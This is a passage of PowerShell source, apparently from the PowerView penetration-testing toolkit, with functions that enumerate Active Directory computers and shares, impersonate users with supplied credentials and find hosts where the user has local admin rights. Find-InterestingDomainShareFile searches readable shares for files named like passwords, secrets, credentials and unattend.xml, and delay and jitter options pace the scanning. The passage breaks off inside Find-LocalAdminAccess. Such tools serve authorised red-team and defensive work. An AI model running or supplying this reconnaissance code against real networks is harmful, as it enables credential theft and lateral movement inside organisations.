                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    # and all clauses
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {
<#
.SYNOPSIS

Searches for computer shares on the domain. If -CheckShareAccess is passed,
then only shares the current user has read access to are returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. If -CheckShareAccess is passed, then
[IO.Directory]::GetFiles() is used to check if the current user has read
access to the given share. If -Credential is passed, then
Invoke-UserImpersonation is used to impersonate the specified user before
enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainShare

Find all domain shares in the current domain.

.EXAMPLE

Find-DomainShare -CheckShareAccess

Find all domain shares in the current domain that the current user has
read access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches for domain shares in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.ShareInfo
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # get the shares for this host and check what we find
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        # $Remark = $Share.Remark
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            # see if we want to check access to this share
                            if ($CheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
<#
.SYNOPSIS

Searches for files matching specific criteria on readable shares
in the domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. It will then use Find-InterestingFile on each
readhable share, searching for files marching specific criteria. If -Credential
is passed, then Invoke-UserImpersonation is used to impersonate the specified
user before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER SharePath

Specifies one or more specific share paths to search, in the form \\COMPUTER\Share

.PARAMETER ExcludedShares

Specifies share paths to exclude, default of C$, Admin$, Print$, IPC$.

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-InterestingDomainShareFile

Finds 'interesting' files on the current domain.

.EXAMPLE

Find-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')

Finds 'interesting' files on readable shares on the specified systems.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DEV\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches interesting files in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    # if a share is passed as the server
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        # get the shares for this host and display what we find
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            # make sure we get a real share name back
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                # skip this share if it's in the exclude list
                                if ($ExcludedShares -NotContains $ShareName) {
                                    # check if the user has access to this path
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {
<#
.SYNOPSIS

Finds machines on the local domain where the current user has local administrator access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and for each computer it checks if the current user
has local administrator access using Test-AdminAccess. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

Idea adapted from the local_admin_search_enum post module in Metasploit written by:
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-LocalAdminAccess

Finds machines in the current domain the current user has admin access to.

.EXAMPLE

Find-LocalAdminAccess -Domain dev.testlab.local

Finds machines in the dev.testlab.local domain the current user has admin access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential $Cred

Finds machines in the testlab.local domain that the user with the specified -Credential
has admin access to.

.OUTPUTS

String

Computer dnshostnames the current user has administrative access to.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

